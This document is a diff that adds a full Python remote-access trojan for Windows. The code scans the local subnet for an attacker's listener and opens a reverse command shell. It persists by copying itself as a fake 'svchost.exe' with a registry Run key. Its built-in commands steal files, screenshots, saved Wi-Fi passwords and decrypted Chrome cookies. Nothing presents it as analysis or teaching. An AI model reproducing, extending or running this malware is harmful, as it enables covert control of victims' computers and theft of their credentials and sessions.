@@ -1,0 +1,195 @@
+import socket
+import subprocess
+import time
+import os
+import pyautogui
+import shutil
+import sqlite3
+import base64
+import json
+import win32crypt
+from Crypto.Cipher import AES
+
+PORT = 4443
+CHECK_INTERVAL = 10
+
+def get_network_segment():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+        base_ip = '.'.join(ip.split('.')[:-1])
+        return f"{base_ip}.1-255"
+    except:
+        return None
+
+def find_listener():
+    network_segment = get_network_segment()
+    if not network_segment:
+        return None
+    
+    base_ip = '.'.join(network_segment.split('.')[:-1])
+    for i in range(1, 255):
+        target_ip = f"{base_ip}.{i}"
+        if target_ip == get_active_ip():
+            continue
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(0.5)
+            result = sock.connect_ex((target_ip, PORT))
+            sock.close()
+            if result == 0:
+                return target_ip
+        except:
+            continue
+    return None
+
+def get_active_ip():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except:
+        return None
+
+def setup_persistence():
+    dest = os.path.join(os.getenv("APPDATA"), "svchost.exe")
+    if not os.path.exists(dest):
+        shutil.copy2(__file__, dest)
+        os.system(f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v svchost /t REG_SZ /d "{dest}" /f')
+
+def connect():
+    while True:
+        try:
+            listener_ip = find_listener()
+            if listener_ip:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.connect((listener_ip, PORT))
+                return sock
+        except:
+            pass
+        time.sleep(CHECK_INTERVAL)
+
+def decrypt_cookie(buff, master_key):
+    try:
+        iv = buff[3:15]
+        payload = buff[15:]
+        cipher = AES.new(master_key, AES.MODE_GCM, iv)
+        decrypted = cipher.decrypt(payload)
+        return decrypted[:-16].decode()
+    except:
+        return "[Decryption Failed]"
+
+def handle_server(s):
+    cwd = os.getcwd()
+    try:
+        while True:
+            cmd = s.recv(4096).decode().strip()
+            if not cmd:
+                continue
+            if cmd.lower() == "exit":
+                break
+            if cmd.lower() == "cmd":
+                cmd = "ver && echo. && cd"
+
+            if cmd.lower().startswith("cd"):
+                path = cmd[3:].strip()
+                new_dir = os.path.join(cwd, path) if not os.path.isabs(path) else path
+                if os.path.isdir(new_dir):
+                    cwd = os.path.abspath(new_dir)
+                    s.sendall((cwd + "\n__end__").encode())
+                else:
+                    s.sendall(b"The system cannot find the path specified.\n__end__")
+                continue
+
+            if cmd.lower().startswith("download "):
+                try:
+                    filename = cmd[9:].strip()
+                    file_path = os.path.join(cwd, filename)
+                    if not os.path.isfile(file_path):
+                        s.sendall(f"[!] File not found: {filename}\n__end__".encode())
+                        continue
+                    with open(file_path, "rb") as f:
+                        data = f.read()
+                    s.sendall(f"FILE {len(data)}\n".encode())
+                    s.sendall(data)
+                except Exception as e:
+                    s.sendall(f"[!] Download error: {e}\n__end__".encode())
+                continue
+
+            if cmd.lower() == "screenshot":
+                try:
+                    temp_file = os.path.join(os.getenv("TEMP"), "scr_temp.png")
+                    pyautogui.screenshot(temp_file)
+                    with open(temp_file, "rb") as f:
+                        img_data = f.read()
+                    s.sendall(f"SCREENSHOT {len(img_data)}\n".encode())
+                    s.sendall(img_data)
+                    os.remove(temp_file)
+                except Exception as e:
+                    s.sendall(f"[!] Screenshot error: {e}\n__end__".encode())
+                continue
+
+            if cmd.lower() == "wifi_dump":
+                try:
+                    result = subprocess.run("netsh wlan show profiles", shell=True, capture_output=True, text=True)
+                    profiles = [line.split(":")[1].strip() for line in result.stdout.splitlines() if "All User Profile" in line]
+                    dump = ""
+                    for profile in profiles:
+                        res = subprocess.run(f'netsh wlan show profile "{profile}" key=clear', shell=True, capture_output=True, text=True)
+                        password = "[NO PASSWORD FOUND]"
+                        for line in res.stdout.splitlines():
+                            if "Key Content" in line:
+                                password = line.split(":")[1].strip()
+                                break
+                        dump += f"{profile}: {password}\n"
+                    s.sendall((dump or "[!] No Wi-Fi profiles found.\n").encode() + b"__end__")
+                except Exception as e:
+                    s.sendall(f"[!] Wi-Fi dump error: {e}\n__end__".encode())
+                continue
+
+            if cmd.lower() == "cookie_dump":
+                try:
+                    cookie_db = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies")
+                    if not os.path.exists(cookie_db):
+                        s.sendall(b"[!] Chrome Cookie DB not found.\n__end__")
+                        continue
+                    temp_db = os.path.join(os.getenv("TEMP"), "chrome_cookies.db")
+                    shutil.copy2(cookie_db, temp_db)
+                    with open(os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Local State"), "r", encoding="utf-8") as f:
+                        local_state = json.load(f)
+                    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
+                    master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+                    conn = sqlite3.connect(temp_db)
+                    cursor = conn.cursor()
+                    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
+                    cookies = ""
+                    for host, name, encrypted_value in cursor.fetchall():
+                        value = decrypt_cookie(encrypted_value, master_key)
+                        cookies += f"{host}\n  {name} = {value}\n\n"
+                    cursor.close()
+                    conn.close()
+                    os.remove(temp_db)
+                    s.sendall((cookies or "[!] No cookies found.\n").encode() + b"__end__")
+                except Exception as e:
+                    s.sendall(f"[!] Cookie dump error: {e}\n__end__".encode())
+                continue
+
+            result = subprocess.run(cmd, shell=True, cwd=cwd, capture_output=True, text=True)
+            output = result.stdout + result.stderr
+            if not output:
+                output = "[*] No output returned.\n"
+            s.sendall(output.encode() + b"__end__")
+
+    except Exception as e:
+        pass
+
+if __name__ == "__main__":
+    setup_persistence()
+    while True:
+        sock = connect()
+        handle_server(sock)
+        time.sleep(CHECK_INTERVAL)
